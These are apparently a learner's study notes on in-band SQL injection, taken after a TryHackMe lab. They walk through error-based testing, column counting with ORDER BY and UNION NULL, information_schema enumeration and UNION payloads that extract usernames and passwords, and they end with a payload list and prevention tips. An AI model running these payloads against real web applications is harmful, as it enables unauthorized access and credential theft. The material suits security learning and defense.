# In-Band SQL Injection

## Introduction

In-Band SQL Injection is the most common type of SQL Injection.

In this attack, the attacker uses the same communication channel to:

- Send the SQL Injection payload
- Receive the database response

The results are directly visible in the web application.

---

# Types of In-Band SQL Injection

There are two main types:

1. Error-Based SQL Injection
2. UNION-Based SQL Injection

---

# Error-Based SQL Injection

Error-Based SQL Injection uses database error messages to gather information.

If an application displays database errors, attackers can learn:

- Database type
- Table names
- Column names
- Query structure

---

## Example

A website URL:

```text
http://example.com/products?id=1
```

The backend query:

```sql
SELECT *
FROM products
WHERE id=1;
```

---

Testing with:

```sql
'
```

The query becomes:

```sql
SELECT *
FROM products
WHERE id='
```

This breaks the query syntax.

The database may return an error:

```text
SQL syntax error near ''
```

This indicates possible SQL Injection.

---

# UNION-Based SQL Injection

UNION-Based SQL Injection uses the SQL UNION operator to combine results from another query.

---

## What is UNION?

UNION combines the output of multiple SELECT statements.

Example:

```sql
SELECT username FROM users

UNION

SELECT name FROM employees;
```

Both results are joined together.

---

# Important UNION Rule

Both SELECT statements must have:

- Same number of columns
- Compatible data types

Example:

Valid:

```sql
SELECT id,name FROM users

UNION

SELECT id,title FROM products;
```

Both return:

```text
2 columns
```

---

Invalid:

```sql
SELECT id,name FROM users

UNION

SELECT username FROM admins;
```

Different column count causes an error.

---

# Finding Number of Columns

Before using UNION injection, find how many columns the original query returns.

---

## Method 1 - ORDER BY

Test:

```sql
' ORDER BY 1--
```

Then:

```sql
' ORDER BY 2--
```

Then:

```sql
' ORDER BY 3--
```

Continue increasing.

---

Example:

Works:

```sql
ORDER BY 3
```

Fails:

```sql
ORDER BY 4
```

Meaning:

```text
Number of columns = 3
```

---

# Method 2 - UNION NULL Testing

Start:

```sql
' UNION SELECT NULL--
```

Increase columns:

```sql
' UNION SELECT NULL,NULL--
```

Then:

```sql
' UNION SELECT NULL,NULL,NULL--
```

When the page loads correctly, the column count is found.

---

# Finding Displayed Columns

Not every column appears on the webpage.

Test:

```sql
' UNION SELECT 1,2,3--
```

If page shows:

```text
2
```

The second column is visible.

Use that column to extract data.

---

# Database Enumeration

After confirming UNION injection, extract database information.

---

## Database Name

```sql
SELECT database();
```

Example payload:

```sql
' UNION SELECT NULL,database()--
```

---

# Finding Tables

Most databases store metadata.

In MySQL:

```sql
information_schema
```

contains database structure.

Find tables:

```sql
SELECT table_name
FROM information_schema.tables;
```

Example:

```sql
' UNION SELECT NULL,table_name
FROM information_schema.tables--
```

---

# Finding Columns

After finding a table:

```sql
SELECT column_name
FROM information_schema.columns;
```

Example:

```sql
' UNION SELECT NULL,column_name
FROM information_schema.columns
WHERE table_name='users'--
```

---

# Extracting Data

After finding:

Table:

```text
users
```

Columns:

```text
username
password
```

Extract:

```sql
' UNION SELECT username,password
FROM users--
```

Example output:

```text
admin : password123
```

---

# Attack Flow

```
Find Input Point
        |
        v
Test SQL Injection
        |
        v
Find Column Count
        |
        v
Find Visible Columns
        |
        v
Enumerate Database
        |
        v
Find Tables
        |
        v
Find Columns
        |
        v
Extract Data
```

---

# Useful Payloads

## Test Injection

```sql
'
```

---

## Comment Query

```sql
--
```

---

## Find Columns

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
```

---

## UNION Test

```sql
UNION SELECT NULL,NULL--
```

---

## Current Database

```sql
UNION SELECT database()
```

---

# Prevention

Prevent In-Band SQL Injection using:

- Prepared statements
- Parameterized queries
- Input validation
- Least privilege database users
- Hide detailed database errors

Example:

```sql
SELECT *
FROM users
WHERE id=?;
```

The user input cannot change the SQL logic.

---

# Key Takeaways

- In-Band SQL Injection shows results directly.
- Error-Based SQLi uses database errors.
- UNION SQLi combines attacker queries with original queries.
- Column count must match for UNION attacks.
- information_schema helps discover database structure.
- Never expose database errors to users.

---

## Practice

Completed:

TryHackMe SQL Injection Introduction

Topics:

- In-Band SQL Injection
- Error-Based SQL Injection
- UNION Attacks
- Database Enumeration